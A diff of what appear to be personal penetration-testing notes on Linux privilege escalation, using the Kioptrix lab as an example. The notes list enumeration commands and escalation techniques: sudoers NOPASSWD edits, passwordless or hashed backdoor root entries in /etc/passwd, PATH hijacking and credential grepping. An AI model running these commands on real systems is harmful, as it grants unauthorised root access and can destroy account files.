@@ -14,119 +14,103 @@ Search Tag: #📕
 ___
 
 ## Description:  
+Auto enumeration with [linPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)
+### useful enumeration
 
-### look for vulnerable programs that run as root
-
-[gtfobins](https://gtfobins.github.io/)
+users
+`cat /etc/passwd`
 
 **What commands can the user execute with sudo?
-
 `sudo -l
 
 **What is the kernel version and architecture type?
-
 `uname -a
-
 `uname -r
 
 **What is the OS version
-
 `cat /etc/*-release
+kernel modules
+`lsmod`
+`/sbin/modinfo libata`
 
 **What languages are installed?
-
 `man -k language
-
 `which gcc
-
 `which g++
 
+**running processes**
+ps aux
+
 **What are the SUID/GUID binaries?
-
 ``find / -perm -u=s -type f 2>/dev/null
-
 ``find / -perm -g=s -type f 2>/dev/null
 
-** Are there world writable files?
+look for vulnerable programs that run as root
+[gtfobins](https://gtfobins.github.io/)
 
-`find / -perm -2 –type f
+**Are there world writable files?
+`find / -writable -type d 2>/dev/null
 
 **What have users been doing? Command history?
-
 `history
-
 ``.bash_history
 
 **Are there any plaintext credentials to be found?
-
 `find . -type f | xargs grep –i “password”
-
 `grep –r . –e “password” 2>/dev/null
 
 **What jobs are scheduled?
-
 `crontab -l
-
 l`s -lah /etc/cron* 2>/dev/null
+`cat /etc/crontab`
+
+networking
+`/sbin/route`
+`ss -anp`
+`cd /etc/iptables`
+
+**applications installed**
+`dpkg -l`
+
+**unmounted disks
+`cat /etc/fstab`
+`mount`
+`/bin/lsblk`
 
 **Scripts that can be used if they run as root:
-
 `echo “user ALL=(ALL) NOPASSWD:ALL” >> /etc/sudoers
-
 `echo “user::0:0:System Administrator:/root/root:/bin/bash” >> /etc/passwd
-
 `bash -i
 
 **Editing the Sudoers file to give root
-
 change:
-
 `loneferret ALL=NOPASSWD: !/usr/bin/su, /usr/local/bin/ht 
-
 To:
-
 `loneferret ALL=NOPASSWD: /bin/su, /usr/local/bin/ht 
-
 `loneferret@Kioptrix3:~$ sudo /bin/su 
 
 **What processes and services are running?  Which are running as root?
-
 `ps –ef
-
 `ps –ef | grep root
 
-**Is /etc/passwd writable?
-
-`echo root::0:0:root:/root:/bin/bash > /etc/passwd
-
-Removing x means root requires no password anymore
-
+**Is /etc/passwd writable?**
+Removing x means root requires no password
+`echo root::0:0:root:/root:/bin/bash > /etc/passwd`
 --OR--
-
 generate hash of the password:
-
 `openssl passwd -1 -salt [salt value] {password}
-
 `openssl passwd -1 -salt user3 pass123
-
 to create a second root user with "mrcake" password:
-
 `echo "root2:WVLY0mgH0RtUI:0:0:root:/root:/bin/bash" >> /etc/passwd
-
 to switch to a root2 account that was just created:
-
 `su root2
-
 `Password: mrcake
 
-**Can you run tcpdump?
-
+**Can you run tcpdump?**
 run tcpdump with -I lo for loopback
-
 or what other systems are connecting to it? You might be able to get a username and password
 
-**Program that runs a command without an absolute path
-
+**Program that runs a command without an absolute path**
 Create a program with the same name in the tmp directory (echo /bin/bash >> command) and then add tmp to the beginning of path (export PATH=/tmp:$PATH)
 
 ```
